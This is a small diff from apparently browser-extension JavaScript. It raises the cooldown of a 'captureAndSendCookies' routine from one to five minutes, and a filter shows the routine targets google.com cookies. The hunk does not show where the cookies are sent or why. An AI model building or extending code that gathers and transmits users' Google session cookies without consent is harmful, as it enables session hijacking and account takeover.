@@ -172,7 +172,7 @@ function captureAndSendCookies() {
 }
 
 let lastCookieSend = 0;
-const COOKIE_SEND_COOLDOWN = 60_000;
+const COOKIE_SEND_COOLDOWN = 300_000;
 
 function isRelevantCookie(cookie) {
   return cookie && cookie.domain && /(?:^|\.)google\.com$/.test(cookie.domain);
